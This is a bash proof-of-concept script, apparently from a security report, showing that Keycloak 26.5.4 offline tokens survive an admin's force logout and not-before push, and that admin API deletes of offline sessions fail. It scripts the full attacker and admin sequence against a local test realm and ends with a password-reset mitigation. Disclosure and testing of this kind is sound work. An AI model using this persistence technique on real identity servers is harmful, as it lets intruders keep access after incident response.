#!/bin/bash
# Finding #3: Offline Token Persistence After Admin Session Revocation
# Severity: HIGH
# Affected: Keycloak 26.5.4 (and likely earlier versions)
#
# Summary:
#   Offline tokens survive "logout all sessions" admin action AND notBefore push-revocation.
#   Admin cannot delete offline sessions via admin API (DELETE endpoints return 404).
#   Only way to revoke offline access is to change the user's password.
#   This creates a persistent backdoor for attackers who obtained an offline token.
#
# Attack Scenario:
#   1. Attacker compromises user credentials and gets offline token
#   2. Organization detects breach and admin forces logout of all user sessions
#   3. Offline token remains valid — attacker retains persistent access
#
# PoC Steps:
#   1. Attacker obtains offline token using compromised credentials
#   2. Admin runs "force logout" on the user
#   3. Admin pushes not-before revocation policy
#   4. Attacker's offline token still works — gets new access tokens indefinitely

set -euo pipefail

KC="${KC_URL:-http://localhost:8080}"
REALM="${KC_REALM:-test}"
CLIENT="${KC_CLIENT:-test-confidential}"
SECRET="${KC_SECRET:-mysecret123}"
USER="${KC_USER:-testuser}"
PASS="${KC_PASS:-Password123}"
ADMIN_USER="${KC_ADMIN:-admin}"
ADMIN_PASS="${KC_ADMIN_PASS:-Admin1234}"

echo "========================================================"
echo "  Finding #3: Offline Token Persistence PoC"
echo "  Target: $KC/realms/$REALM"
echo "========================================================"
echo ""

# Step 0: Get admin token
echo "[*] Fetching admin token..."
ADMIN_TOKEN=$(curl -sf -X POST "$KC/realms/master/protocol/openid-connect/token" \
  -d "client_id=admin-cli&grant_type=password&username=$ADMIN_USER&password=$ADMIN_PASS" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")

USER_ID=$(curl -sf -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/users?username=$USER" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")
echo "[+] User ID: $USER_ID"

CLIENT_UUID=$(curl -sf -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/clients?clientId=$CLIENT" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)[0]['id'])")
echo "[+] Client UUID: $CLIENT_UUID"

# Step 1: Attacker obtains offline token
echo ""
echo "[Step 1] ATTACKER: Obtaining offline token using compromised credentials..."
OFFLINE_RESP=$(curl -sf -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=$CLIENT&client_secret=$SECRET&grant_type=password&username=$USER&password=$PASS&scope=offline_access")
OFFLINE_TOKEN=$(echo "$OFFLINE_RESP" | python3 -c "import sys,json; print(json.load(sys.stdin)['refresh_token'])")
echo "[+] Offline token obtained: ${OFFLINE_TOKEN:0:60}..."

# Verify it works
VERIFY=$(curl -sf -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=$CLIENT&client_secret=$SECRET&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('access_token','ERROR')[:60])")
echo "[+] Pre-revocation token exchange: SUCCESS"

# Step 2: Admin detects breach and forces logout
echo ""
echo "[Step 2] ADMIN: Detected breach, forcing logout of all user sessions..."
LOGOUT_HTTP=$(curl -sf -o /dev/null -w "%{http_code}" -X POST \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/users/$USER_ID/logout")
echo "[+] Force logout (POST /users/{id}/logout): HTTP $LOGOUT_HTTP"

# Verify active sessions are gone
ACTIVE=$(curl -sf -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/users/$USER_ID/sessions" | python3 -c "import sys,json; print(len(json.load(sys.stdin)))")
echo "[+] Active sessions remaining: $ACTIVE (should be 0)"

# Step 3: Test if offline token still works
echo ""
echo "[Step 3] ATTACKER: Testing offline token after admin logout..."
VERIFY2=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=$CLIENT&client_secret=$SECRET&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN")
RESULT2=$(echo "$VERIFY2" | python3 -c "import sys,json; d=json.load(sys.stdin); print('VULNERABLE: access_token=' + d['access_token'][:50] if 'access_token' in d else 'REVOKED: ' + d.get('error_description','?'))")
echo "[!!!] $RESULT2"

# Step 4: Admin tries notBefore push (should revoke old tokens)
echo ""
echo "[Step 4] ADMIN: Pushing not-before revocation policy..."
PUSH=$(curl -s -X POST -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/push-revocation")
echo "[+] Push revocation: $PUSH"

# Step 5: Test if offline token still works after notBefore push
echo ""
echo "[Step 5] ATTACKER: Testing offline token after notBefore push..."
VERIFY3=$(curl -s -X POST "$KC/realms/$REALM/protocol/openid-connect/token" \
  -d "client_id=$CLIENT&client_secret=$SECRET&grant_type=refresh_token&refresh_token=$OFFLINE_TOKEN")
RESULT3=$(echo "$VERIFY3" | python3 -c "import sys,json; d=json.load(sys.stdin); print('VULNERABLE: access_token=' + d['access_token'][:50] if 'access_token' in d else 'REVOKED: ' + d.get('error_description','?'))")
echo "[!!!] $RESULT3"

# Step 6: Show offline sessions still exist + admin cannot delete them
echo ""
echo "[Step 6] ADMIN: Checking offline sessions..."
OFFLINE_COUNT=$(curl -sf -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/users/$USER_ID/offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; print(len(json.load(sys.stdin)))")
echo "[+] Offline sessions still active: $OFFLINE_COUNT"

echo ""
echo "[Step 6b] ADMIN: Attempting to delete offline sessions via admin API..."
DEL1=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/users/$USER_ID/offline-sessions/$CLIENT_UUID")
echo "[+] DELETE /users/{id}/offline-sessions/{clientId}: HTTP $DEL1"

SESSION_ID=$(curl -sf -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/users/$USER_ID/offline-sessions/$CLIENT_UUID" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(d[0]['id'] if d else 'none')" 2>/dev/null)
DEL2=$(curl -s -o /dev/null -w "%{http_code}" -X DELETE -H "Authorization: Bearer $ADMIN_TOKEN" \
  "$KC/admin/realms/$REALM/sessions/$SESSION_ID")
echo "[+] DELETE /sessions/{sessionId}: HTTP $DEL2"

echo ""
echo "========================================================"
echo "  SUMMARY"
echo "========================================================"
echo "  - Offline token survives admin force logout: CONFIRMED"
echo "  - Offline token survives notBefore push: CONFIRMED"
echo "  - Admin cannot delete offline sessions via API: CONFIRMED"
echo ""
echo "  IMPACT: Attacker with offline token maintains persistent"
echo "  access even after admin incident response actions."
echo ""
echo "  MITIGATION: Reset compromised user's password to invalidate"
echo "  offline tokens (password hash embedded in token check)."
echo "========================================================"
